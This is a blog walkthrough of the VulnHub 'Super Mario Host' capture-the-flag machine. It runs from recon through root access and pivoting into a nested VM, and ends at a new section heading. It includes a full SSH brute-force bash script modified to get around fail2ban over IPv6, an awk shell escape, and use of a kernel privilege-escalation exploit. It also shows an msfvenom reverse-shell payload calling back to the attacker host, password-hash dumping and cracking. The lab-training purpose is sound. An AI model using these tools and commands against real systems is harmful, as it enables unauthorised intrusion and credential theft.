---
layout: single
title: Super Mario Host CTF Walkthrough
date: 2017-06-16
categories:
  - security
  - ctf
  - walkthrough
tags:
  - super mario host
  - vulnhub
---
[Super Mario Host](https://www.vulnhub.com/entry/super-mario-host-101,186/) is an SMB themed CTF created by [mr_h4sh](https://twitter.com/mr_h4sh/). The goal of the CTF is to discover the two hidden flags and to find the passwords of all the characters with accounts on the system.

## Service Discovery
Running Nmap revealed that the target machine has an SSH and HTTP server running on ports 22 and 8180. Based on the fingerprinting Nmap carried out, they seemed to be OpenSSH 6.6.1p1 and Apache:

```shell_session
msf > db_nmap -PN 10.2.0.0/24
***
[*] Nmap: Nmap scan report for 10.2.0.104
[*] Nmap: Host is up (0.00016s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 8180/tcp open  unknown
***
msf > db_nmap -sV 10.2.0.104 -p 22,8180
[*] Nmap: Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-11 13:52 BST
[*] Nmap: Nmap scan report for 10.2.0.104
[*] Nmap: Host is up (0.00030s latency).
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
[*] Nmap: 8180/tcp open  http    Apache httpd
[*] Nmap: MAC Address: 08:00:27:BE:21:FC (Oracle VirtualBox virtual NIC)
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 24.54 seconds
```

## Analysis of Web Server
Taking a look at the default page being served by the web server indicated the web server is actually nginx, as opposed to Apache, as the default nginx page is being served with the message:

> Welcome to nginx!
If you see this page, the nginx web server is successfully installed and working.
Further configuration is required.

> For online documentation and support please refer to nginx.org.
Commercial support is available at nginx.org.

> Thank you for using nginx.

Nikto seemed to agree with Nmap that the web server is indeed Apache, and also found one of the default Apache files as well, but failed to find anything else of interest:

```shell_session
root@kali:~# nikto -host http://10.2.0.104:8180
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.2.0.104
+ Target Hostname:    10.2.0.104
+ Target Port:        8180
+ Start Time:         2017-06-11 14:01:36 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ Server leaks inodes via ETags, header found with file /, fields: 0x264 0x54a3d83d87463
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7537 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2017-06-11 14:01:49 (GMT1) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Running dirb using the `big.txt` wordlist uncovered a single interesting entry, which was a file named `vhosts`:

```shell_session
root@kali:~# dirb http://10.2.0.104:8180 /usr/share/wordlists/dirb/big.txt
***
+ http://10.2.0.104:8180/server-status (CODE:403|SIZE:215)
+ http://10.2.0.104:8180/vhosts (CODE:200|SIZE:1364)
***
```

The file contained an Apache virtual host configuration file, eluding to there being a vhost configured on the machine:

```apache
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.

	ServerName mario.supermariohost.local
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/supermariohost
	DirectoryIndex mario.php

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/supermariohost_error.log
	CustomLog ${APACHE_LOG_DIR}/supermariohost_access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>
```

Virtual hosts work by checking the value submitted in the `Host` header of a HTTP request and then using that to choose which directory to serve. In this instance, if the server is addressed by accessing `http://mario.supermariohost.local:8180/` as opposed to `http://10.2.0.104:8180/`, it would serve the `mario.php` file from the `/var/www/supermariohost` directory.

This is easily set when using cURL to access files, but in order to easily view the rendered pages, I added a new entry to my hosts file so I could access it from a browser easily by running `echo "10.2.0.104 mario.supermariohost.local" >> /etc/hosts`

Once the hosts file was updated, I navigated to the page and had a poke around the JavaScript to see if there was any interesting easter eggs, but didn't find anything; just a small Mario game:

![](/assets/images/super-mario-host-ctf-walkthrough/mario-page.png)

I also re-ran Nikto and dirb, but this time specifying the Mario vhost using `nikto -host 10.2.0.104:8180 -vhost mario.supermariohost.local` and `dirb http://10.2.0.104:8180 /usr/share/wordlists/dirb/big.txt -H "Host: mario.supermariohost.local"`. Neither scan discovered any new files being served.

Re-winding back to the vhost file, as there was a `mario.php` file being served as the default page, I tried `luigi.php` and found a message from Mario's taller, greener brother:

> Hey!! It'sa Luiiiggiii!!
My short brother doesn't know that I'm wandering around his host and messing around, he's new with computers!
Since I'm here I want to tell you more about myself...my brother is a nice person but we are in love for the same person: Princess Peach! I hope she will find out about this.
I Love Peach
Forever yours,
Luigi

As I manually found two files named after Super Mario characters, I put together a word list using character names from the series to use with dirb, but none yielded any hits (other than the already identified `mario.php` and `luigi.php`).

## SSH Enumeration & Analysis
With no more leads to follow on the web server, I began to enumerate the users on the SSH server using the `ssh_enumusers` Metasploit module.

The user list I used for this was the word list I had previously generated containing the Super Mario character names.

```shell_session
msf auxiliary(ssh_enumusers) > run

[*] 10.2.0.104:22 - SSH - Checking for false positives
[*] 10.2.0.104:22 - SSH - Starting scan
[-] 10.2.0.104:22 - SSH - User 'yoshi' not found
[-] 10.2.0.104:22 - SSH - User 'luigi' not found
[-] 10.2.0.104:22 - SSH - User 'mario' not found
[-] 10.2.0.104:22 - SSH - User 'toad' not found
[+] 10.2.0.104:22 - SSH - User 'donkeykong' found
[-] 10.2.0.104:22 - SSH - User 'donkey-kong' on could not connect
[-] 10.2.0.104:22 - SSH - User 'kingkoopa' not found
[-] 10.2.0.104:22 - SSH - User 'king-koopa' not found
[-] 10.2.0.104:22 - SSH - User 'kingboo' not found
[-] 10.2.0.104:22 - SSH - User 'king-boo' not found
[-] 10.2.0.104:22 - SSH - User 'princesspeach' not found
[-] 10.2.0.104:22 - SSH - User 'princess-peach' not found
[-] 10.2.0.104:22 - SSH - User 'rosalina' not found
[+] 10.2.0.104:22 - SSH - User 'toadette' found
[-] 10.2.0.104:22 - SSH - User 'princessdaisy' on could not connect
[-] 10.2.0.104:22 - SSH - User 'princess-daisy' not found
[-] 10.2.0.104:22 - SSH - User 'bowserjr' not found
[-] 10.2.0.104:22 - SSH - User 'bowser-jr' not found
[-] 10.2.0.104:22 - SSH - User 'kamek' not found
[-] 10.2.0.104:22 - SSH - User 'koopalings' not found
[-] 10.2.0.104:22 - SSH - User 'toadsworth' not found
[-] 10.2.0.104:22 - SSH - User 'waluigi' not found
[-] 10.2.0.104:22 - SSH - User 'birdo' not found
[-] 10.2.0.104:22 - SSH - User 'wario' not found
[+] 10.2.0.104:22 - SSH - User 'lemmykoopa' found
[-] 10.2.0.104:22 - SSH - User 'lemmy-koopa' on could not connect
[-] 10.2.0.104:22 - SSH - User 'peteypiranha' not found
[-] 10.2.0.104:22 - SSH - User 'petey-piranha' not found
[-] 10.2.0.104:22 - SSH - User 'drmario' not found
[-] 10.2.0.104:22 - SSH - User 'dr-mario' not found
[-] 10.2.0.104:22 - SSH - User 'pauline' not found
[-] 10.2.0.104:22 - SSH - User 'kammykoopa' not found
[-] 10.2.0.104:22 - SSH - User 'kammy-koopa' not found
[-] 10.2.0.104:22 - SSH - User 'fawful' not found
[-] 10.2.0.104:22 - SSH - User 'wart' not found
[+] 10.2.0.104:22 - SSH - User 'tatanga' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

There was an interesting pattern with these results, which made me believe I was getting false-positives. That being, for every user that it believed it had found, the next user timed out, for example:

```
[+] 10.2.0.104:22 - SSH - User 'donkeykong' found
[-] 10.2.0.104:22 - SSH - User 'donkey-kong' on could not connect
```

As there was a rather consistent pattern to the timeouts, this led me to believe there may be something such as [fail2ban](https://www.fail2ban.org/) running, which will block IP addresses for a specific amount of time, should it detect enough suspicious activity in the log files of the services it is monitoring.

On the off-chance it was indeed fail2ban causing the timeouts, I decided to try enumeration using IPv6 instead, as fail2ban has no IPv6 support at all (as of June 2017).

To do this, I needed to identify the IPv6 address of the target machine, which I did using the `ipv6_multicast_ping` Metasploit module; though, this can also be done using the `ping6` application.

```shell_session
msf auxiliary(ssh_enumusers) > use auxiliary/scanner/discovery/ipv6_multicast_ping
msf auxiliary(ipv6_multicast_ping) > set INTERFACE eth1
INTERFACE => eth1
msf auxiliary(ipv6_multicast_ping) > run

[*] Sending multicast pings...
[*] Listening for responses...
[*]    |*| fe80::800:27ff:fe00:0 => 0a:00:27:00:00:00
[*]    |*| fe80::a00:27ff:febe:21fc => 08:00:27:be:21:fc
[*] Auxiliary module execution completed
```

As there were two hosts with IPv6 addresses responding to the multicast, I ran Nmap against them to narrow down which one is the target, and found that `fe80::a00:27ff:febe:21fc` had the same open ports:

```shell_session
msf auxiliary(ssh_enumusers) > db_nmap -sS -6 fe80::a00:27ff:febe:21fc%eth1
[*] Nmap: Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-11 16:29 BST
[*] Nmap: Nmap scan report for fe80::a00:27ff:febe:21fc
[*] Nmap: Host is up (0.000093s latency).
[*] Nmap: Not shown: 998 closed ports
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 22/tcp   open  ssh
[*] Nmap: 8180/tcp open  unknown
[*] Nmap: MAC Address: 08:00:27:BE:21:FC (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

***N.B. %eth1 is appended in some places to the IPv6 address as to indicate which interface to use. For modules / applications that allow you to specify the interface, this can be omitted.***

After identifying the IPv6 address of the target, I began to re-run the `ssh_enumusers` module against it. This time, every request was timing out, however the port was definitely open and the service was definitely listening, which indicated that the Metasploit module may not support IPv6.

As a result of the module failing, I went on the hunt for an SSH brute force script and came across [getsshpass.sh](http://brezular.com/2016/01/11/bash-script-for-dictionary-attack-against-ssh-server/) by Radovan Brezula.

This script doesn't support IPv6 out of the box, but I made a few quick modifications to it in order to use it against the IPv6 target.

The modified script can be downloaded from [This Gist](https://gist.github.com/rastating/30425115b941921c9fd24f0b692f4153) or can be found below:

```bash
#!/bin/bash
#
# sshpass return values:
#   0 - password OK
#   3 - general runtime error
#   5 - bad password
#   255 - connection refused


declare -r START_TIME=$(date +%s.%N)   # Start time of the program

function usage {
  echo -e "Usage: $0 [OPTIONS]"
  echo "OPTIONS: "
  echo -e "   -a    IP address of SSH server"
  echo -e "   -d    TCP port 1 - 65535 of SSH server"
  echo -e "   -n    slow down or speed up attack for number of seconds"
  echo -e "         e.g. 1, 0.1, 0.0, default value is 0.1"
  echo -e "   -p    path to file with passwords"
  echo -e "   -u    path to file with usernames"
  echo -e "   -v    display version"
  echo -e "   -h    display help"
 }

function version
 {
  echo -e "getsshpass.sh 0.8"
  echo -e "Copyright (C) 2016 Radovan Brezula 'brezular'"
  echo -e "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>."
  echo -e "This is free software: you are free to change and redistribute it."
  echo -e "There is NO WARRANTY, to the extent permitted by law."
  exit
 }

function read_args {
 while getopts "a:d:n:p:u:hv" arg; do
    case "$arg" in
       a) ip="$OPTARG";;
       d) port="$OPTARG";;
       n) nval="$OPTARG";;
       p) passlist="$OPTARG"
          initpasslist="$passlist";;
       u) userlist="$OPTARG"
          inituserlist="$userlist";;
       v) version;;
       h) usage
          exit;;
    esac
 done
}

function check_args {
 pthdir="$(dirname $0)"

 if [ -f "$pthdir/x0x901f22result.txt" ]; then
    pass=$(grep -o "d: '.*'" x0x901f22result.txt | cut -d ":" -f2)
    echo "File '$pthdir/x0x901f22result.txt' contains saved password:$pass, nothing to do" && exit
 fi

 type -P sshpass 1>/dev/null
 [ "$?" -ne 0 ] && echo "Utillity 'sshpass' not found, exiting" && exit

 if [ -z "$ip" ]; then
    echo "IP address can't be empty, exiting"
    usage
    exit
 fi

 [ -z "$nval" ] && nval=0.1                                                  # Use default value 0.1s if no -n is entered

 [ -z "$port" ] && echo "TCP port can'be empty, exiting" && usage && exit
 if [[ "$port" =~ ^[[:digit:]]+$ ]]; then
    if ( [ "$port" -gt 65535 ] || [ "$port" -eq 0 ] ); then
       echo "TCP port has to be in range 1 - 65535"
       usage
       exit
    fi
 else
    echo "TCP port must be digit, exiting"
    usage
    exit
 fi

 [ ! -f "$passlist" ] && echo "Can't find file with list of passwords, exiting" && usage && exit
 [ ! -f "$userlist" ] && echo "Can't find file with list of users, exiting" && usage && exit
 fullpasslist="$passlist"                                                                         #Backup original passlist
 fulluserlist="$userlist"                                                                         #Backup oroginal userlist

 # Check SSH connection
 echo -n "Checking SSH connection to '$ip': "
 sshpass -p admin ssh -6 -o StrictHostKeyChecking=no -o ConnectTimeout=8 -p "$port" admin@"$ip" exit &>/dev/null; rvalssh="$?"
 if [ "$rvalssh" == 0 ]; then
    echo "*** OK ***"
    echo "*** Found username: 'admin' and password: 'admin' ***"  > "$pthdir/x0x901f22result.txt"
    evaluate_result
 elif [ "$rvalssh" == 255 ]; then
    echo "*** FAIL ***"
    echo "*** Can't establish SSH connection to '$ip', exiting ***" && exit
 else
    echo "*** OK ***"
 fi

# Read saved username and password from file 01xza01.txt, if file exists read saved credentials from file
    if [ -f "$pthdir/01xza01.txt" ]; then
       lastuser=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f1)
       lastpass=$(head -1 "$pthdir/01xza01.txt" | cut -d ":" -f2)
       echo "Found file: '$pthdir/01xza01.txt' containig previously saved username: '$lastuser' and password: '$lastpass'"
       echo "Restoring attack using username '$lastuser' and password '$lastpass'"
       row1user=$(grep -wno "^$lastuser$" "$userlist"); rvaluser="$?"
       row1pass=$(grep -wno "^$lastpass$" "$passlist"); rvalpass="$?"

       if [ "$rvaluser" == 0 ]; then
          rowuser=$(echo "$row1user" | cut -d ":" -f1)
          tail -n +"$rowuser" "$userlist" > "$userlist"\.new
          userlist=$(echo "$userlist"\.new)
      fi

       if [ "$rvalpass" == 0 ]; then
         rowpass=$(echo "$row1pass" | cut -d ":" -f1)
         tail -n +"$rowpass" "$passlist" > "$passlist"\.new
         passlist=$(echo "$passlist"\.new)
       fi
    else
       [ ! -f "$pthdir/01xza01.txt" ] && echo "Warning: Can't find file containing last used username and password in directory '$pthdir', starting from beginning"
    fi

    maxusercount=$(wc -l "$fulluserlist" | cut -d " " -f1)
    maxpasscount=$(wc -l "$fullpasslist" | cut -d " " -f1)
    maxcount=$(( $maxusercount * $maxpasscount ))
    [ ! -f "$pthdir/01xza01.txt" ] && actualcount=1
}

function parallel_ssh {
 echo "$user":"$pass" > "$pthdir/01xza01.txt"
 sshpass -p "$pass" ssh -6 -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
 [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
    #   While loop eliminates 'Connection refused' attempts -> retval=255 and 'General runtime error' -> retval=3  
    #   It happens when parameter 'n' is too small
    #   retval must be either 0 -> good password or 5 -> bad password
 while [ "$retval" == 255 -o "$retval" == 3 ]; do
    sshpass -p "$pass" ssh -6 -o StrictHostKeyChecking=no -p "$port" "$user"@"$ip" exit &>/dev/null; retval="$?"
    [ "$retval" == 0 ] && echo "*** Found username: '$user' and password: '$pass' ***"  > "$pthdir/x0x901f22result.txt"
    sleep "$nval"
 done
}

function launch_attack {
 while read user; do
    while read pass; do
       if [ ! -f "$pthdir/x0x901f22result.txt" ]; then
         echo "Trying username: '$user' and password: '$pass'"
	 parallel_ssh &>/dev/null &
       else
          evaluate_result
       fi
       sleep $nval
    done < "$passlist"
    passlist="$fullpasslist"                                                        # Always start search with first pass from dictionary when user is changed
 done < "$userlist"
 evaluate_result
}

# Show ellapsed time
function ellapsed_time {
 END_TIME=$(date +%s.%N)
 dt=$(echo "$END_TIME - $START_TIME" | bc)
 dd=$(echo "$dt/86400" | bc)
 dt2=$(echo "$dt-86400*$dd" | bc)
 dh=$(echo "$dt2/3600" | bc)
 dt3=$(echo "$dt2-3600*$dh" | bc)
 dm=$(echo "$dt3/60" | bc)
 ds=$(echo "$dt3-60*$dm" | bc | awk '{printf("%.2f\n", $1)}')

 if [ "$dd" == "0" ] ; then dd=""; else dd=${dd}"d "; fi
 if [ "$dh" == "0" ] ; then dh=""; else dh=${dh}"h "; fi
 if [ "$dm" == "0" ] ; then dm=""; else dm=${dm}"m "; fi

 echo "Ellapsed time: "${dd}""${dh}""${dm}""${ds}"s"
}

function evaluate_result {
    [ -f "$pthdir/01xza01.txt" ] && rm "$pthdir/01xza01.txt"                         # We don't need last saved password when script kills itself (password found) or
    if [ -f "$pthdir/x0x901f22result.txt" ]; then                                    # Display found username and password when password is found
       cat "$pthdir/x0x901f22result.txt"
       ellapsed_time
    else
       echo "*** Password not found, use other dictionary ***"
    fi
    [ -f "$inituserlist".new ] && rm "$inituserlist".new                              # delete files $inituserlist.new and $initpasslist.new
    [ -f "$initpasslist".new ] && rm "$initpasslist".new                              # they're created when interrupted guessing is used   
    pkill sshpass  
}

function monitor_signal {
 trap 'pkill sshpass; echo "Program teminated."; exit' SIGHUP SIGTERM SIGQUIT                             # kill sshpass when script finishes or
 trap 'pkill sshpass; echo "Ctrl+C detected, start script again to continue with attack"; exit' SIGINT    # it is interrupted / suspended
 trap 'pkill sshpass; echo "Ctrl+Z detected, start script again to continue with attack"; exit' SIGTSTP
}


### BODY ###

read_args $@
check_args
monitor_signal
launch_attack
```

For the sake of testing if IPv6 activity was being monitored, I ran the script, using the character word list I had created as both the username and password list. It iterated through every combination, without any timeouts, which indicated that IPv6 was open to a brute force attack.

## Brute Forcing the SSH Server
Once I had confirmed there was no IPv6 monitoring and had a reliable script to perform the attack, I built a new word list using CeWL and John [the Ripper] based on the content of Luigi's message in `luigi.php`. I then used the word list to brute force the SSH server using `getsshpass.sh`:

```shell_session
root@kali:~# cewl http://10.2.0.104:8180/luigi.php -H "Host:mario.supermariohost.local" > luigi-wordlist.txt

root@kali:~# john --wordlist=luigi-wordlist.txt --rules --stdout > luigi-wordlist-mutated.txt

root@kali:~# ./getsshpass.sh -a fe80::a00:27ff:febe:21fc%eth1 -u mario-chars-no-ext.txt -p luigi-wordlist-mutated.txt -d 22
Checking SSH connection to 'fe80::a00:27ff:febe:21fc%eth1': *** OK ***
Warning: Can't find file containing last used username and password in directory '.', starting from beginning
Trying username: 'yoshi' and password: 'Peach'
Trying username: 'yoshi' and password: 'Luiiiggiii'
Trying username: 'yoshi' and password: 'Princess'
***
Trying username: 'luigi' and password: 'luiiiggiii1'
Trying username: 'luigi' and password: 'princess1'
Trying username: 'luigi' and password: 'luigi1'
Trying username: 'luigi' and password: 'Peach1'
Trying username: 'luigi' and password: 'Luiiiggiii1'
Trying username: 'luigi' and password: 'Princess1'
*** Found username: 'luigi' and password: 'luigi1' ***
Ellapsed time: 24.19s
```

![](/assets/images/super-mario-host-ctf-walkthrough/luigi-ssh.png)

## Escaping Limited Shell & Privilege Escalation
As can be seen in the previous screenshot, Luigi's user was stuck in a limited shell, with access to awk, cat, cd, clear, echo, exit, help, history, ll, lpath, ls, lsudo and vim.

Before trying to break out of the shell, I checked out the contents of Luigi's home directory and took a look at the `message` file:

```shell_session
luigi:~$ ls -l
total 4
-rw-r--r-- 1 root root 283 Mar  8 13:45 message
luigi:~$ cat message
YOU BROTHER! YOU!!
I had to see it coming!!
Not only you declare your love for Pricess Peach, my only love and reason of life (and lives, depending from the player), but you also mess with my server!
So here you go, in a limited shell! Now you can't do much, MUHAUHAUHAUHAA

Mario.
```

My first attempt at breaking out of the shell was to try and use command execution from within vim, but the version of vim installed does not allow this, but as awk was available, I was able to break out by running `awk 'BEGIN {system("/bin/bash")}'`

Once out of the shell, I proceeded to look around to see if there was anything that may help me get root, but didn't find anything interesting and instead compiled the [overlayfs exploit](https://www.exploit-db.com/exploits/37292/) and escalated using it:

```shell_session
luigi@supermariohost:~$ uname -a
Linux supermariohost 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
luigi@supermariohost:~$ nano ofs
luigi@supermariohost:~$ mv ofs ofs.c
luigi@supermariohost:~$ gcc ofs.c -o ofs
luigi@supermariohost:~$ ls -l
total 32
-rw-r--r-- 1 root  root    283 Mar  8 13:45 message
-rwxrwxr-x 1 luigi luigi 13650 Jun 11 14:28 ofs
-rw-rw-r-- 1 luigi luigi  4993 Jun 11 14:28 ofs.c
-rw-rw-r-- 1 luigi luigi   945 Jun 11 14:21 shell.php
luigi@supermariohost:~$ chmod +x ofs
luigi@supermariohost:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```

## Acquiring and Cracking First Flag
Now that I had root access, I used msfvenom to create a Meterpreter executable by running `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.2.0.3 -f elf > shell.elf` and executed it on the target whilst running the `multi_handler` module in Metasploit.

Once I had a Meterpreter session, I began to poke around in `/root` and found a file named `flag.zip`. I tried to unzip this on the target, and found that the ZIP file is password protected; so I proceeded to download it and try to crack it using fcrackzip and the word list I had previously generated to crack the SSH passwords:

```shell_session
meterpreter > download flag.zip
[*] downloading: flag.zip -> flag.zip
[*] download   : flag.zip -> flag.zip
***
root@kali:~# fcrackzip -u -D -p luigi-wordlist-mutated.txt flag.zip -v
found file 'flag.txt', (size cp/uc    216/   338, flags 9, chk 1208)
```

As none of the passwords in the word list were successful, I tried again using the `rockyou.txt` word list, and successfully found the password:

```shell_session
root@kali:~# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip -v
found file 'flag.txt', (size cp/uc    216/   338, flags 9, chk 1208)


PASSWORD FOUND!!!!: pw == ilovepeach

root@kali:~# unzip flag.zip
Archive:  flag.zip
[flag.zip] flag.txt password:
  inflating: flag.txt   
```

The first flag contained a message from mr_h4sh that also indicates that in addition to finding the flag, the user should also be attempting to get the passwords for all the users on the machine:

> Well done :D If you reached this it means you got root, congratulations.
Now, there are multiple ways to hack this machine. The goal is to get all the passwords of all the users in this machine. If you did it, then congratulations, I hope you had fun :D

> Keep in touch on twitter through @mr_h4sh

> Congratulations again!

> mr_h4sh

## Finding Mario's Password
With the previous message from mr_h4sh in mind, I ran a couple of post modules in the Meterpreter session to gather the password hashes and see if any SSH credentials were stored on the system. No SSH credentials were found, but I had the hashes that I could try to crack using JTR:

```shell_session
meterpreter > run post/linux/gather/hashdump

[+] root:$6$ZmdseK46$FTvRqEZXdr3DCX2Vd6CXWmWAOJYIjcAI6XQathO3/wgvHEoyeP6DwL3NHZy903HXQ/F2uXiTXrhETX19/txbA1:0:0:root:/root:/bin/bash
[+] mario:$6$WG.vWiw8$OhoMhuAHSqPYTu1wCEWNc4xoUyX6U/TrLlK.xyhRKZB3SyCtxMDSoQ6vioNvpNOu78kQVTbwTcHPQMIDM2CSJ.:1000:1000:Mario,,,:/home/mario:/bin/bash
[+] luigi:$6$kAYr2OVy$1qBRKJIWqkpNohmMIP3r3H3yPDQ9UfUBcO4pahlXf6QfnqgW/XpKYlQD4jN6Cfn.3wKCWoM7gPbdIbnShFJD40:1001:1001::/home/luigi:/usr/bin/lshell
[+] Unshadowed Password File: /root/.msf4/loot/20170612220320_default_10.2.0.104_linux.hashes_381142.txt
```

Once I had the hashes, I created a new word list using Mario's ZIP file password [`ilovepeach`] as the seed for the permutations and ran JTR to get the last two passwords from the system:

```shell_session
root@kali:~# echo "ilovepeach" > mariopass.txt
root@kali:~# john --wordlist=mariopass.txt --rules --stdout > mario-mutation.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
49p 0:00:00:00 100.00% (2017-06-13 00:36) 816.6p/s Ilovepeaching

root@kali:~# john --wordlist=mario-mutation.txt /root/.msf4/loot/20170612220320_default_10.2.0.104_linux.hashes_381142.txt
Created directory: /root/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepeach!      (mario)
ilovepeach!      (root)
```

## Service Discovery on the Warluigi VM
With the first flag down, I began more recon work to try and find the second flag. Part of this involved checking the running processes using `ps aux`, where I found that a VM named `warluigi` was running within the VM.

![](/assets/images/super-mario-host-ctf-walkthrough/xzibit-virtual-machines.jpg)

Running `ifconfig` on the Mario host revealed the network adapter [`virbr0`] that is being used with the Warluigi VM:

```shell_session
eth0      Link encap:Ethernet  HWaddr 08:00:27:be:21:fc  
          inet addr:10.2.0.104  Bcast:10.2.0.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:febe:21fc/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:10351 errors:0 dropped:0 overruns:0 frame:0
          TX packets:9665 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:6614840 (6.6 MB)  TX bytes:8903465 (8.9 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:22 errors:0 dropped:0 overruns:0 frame:0
          TX packets:22 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:1608 (1.6 KB)  TX bytes:1608 (1.6 KB)

virbr0    Link encap:Ethernet  HWaddr fe:54:00:24:ed:ab  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:36 errors:0 dropped:0 overruns:0 frame:0
          TX packets:28 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2860 (2.8 KB)  TX bytes:2720 (2.7 KB)

vnet0     Link encap:Ethernet  HWaddr fe:54:00:24:ed:ab  
          inet6 addr: fe80::fc54:ff:fe24:edab/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:36 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1352 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:500
          RX bytes:3364 (3.3 KB)  TX bytes:71800 (71.8 KB)
```

As Nmap wasn't available on the Mario host, I grabbed a host discovery script and modified it to scan on the 192.168.122.0 subnet:

```bash
#!/bin/sh
pingf(){
    if ping -w 2 -q -c 1 192.168.122."$1" > /dev/null ;
    then
        printf "IP %s is up\n" 192.168.122."$1"
    fi
}

main(){

    NUM=1
    while [ $NUM -lt 255  ];do
        pingf "$NUM" &
        NUM=$(expr "$NUM" + 1)
    done
    wait
}

main
```

I then uploaded and executed it on the Mario host to identify what address had been assigned to the Warluigi host, which was `192.168.122.122`:

```shell_session
meterpreter > upload host_discovery.sh
[*] uploading  : host_discovery.sh -> host_discovery.sh
[*] uploaded   : host_discovery.sh -> host_discovery.sh
meterpreter > shell
Process 1671 created.
Channel 20 created.
chmod +x host_discovery.sh
./host_discovery.sh
IP 192.168.122.1 is up
IP 192.168.122.122 is up
```

Next, I used Metasploit's pivoting functionality to route traffic to `192.168.122.0/24` via the Meterpreter session I had established to the Mario host and proceeded to run a port scan on the Warluigi VM:

```shell_session
msf exploit(handler) > route add 192.168.122.0 255.255.255.0 5
[*] Route added
msf exploit(handler) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.122.0      255.255.255.0      Session 5

msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.122.122
RHOSTS => 192.168.122.122
msf auxiliary(tcp) > set THREADS 50
THREADS => 50
msf auxiliary(tcp) > set PORTS 22-25, 80, 443, 8180
PORTS => 22-25, 80, 443, 8180
msf auxiliary(tcp) > run
```

The results of the port scan indicated that ports 22 and 80 were open with services listening on them, so I loaded up the `ssh_version` module to verify which SSH server was running and to try and fingerprint the OS; which is seemingly Ubuntu 14.04:

```shell_session
msf auxiliary(tcp) > use auxiliary/scanner/ssh/ssh_version
msf auxiliary(ssh_version) > set RHOSTS 192.168.122.122
RHOSTS => 192.168.122.122
msf auxiliary(ssh_version) > run

[*] 192.168.122.122:22    - SSH server version: SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2 ( service.version=6.6.1p1 openssh.comment=Ubuntu-2ubuntu2 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH os.vendor=Ubuntu os.device=General os.family=Linux os.product=Linux os.version=14.04 service.protocol=ssh fingerprint_db=ssh.banner )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Warluigi Web Server Fingerprinting
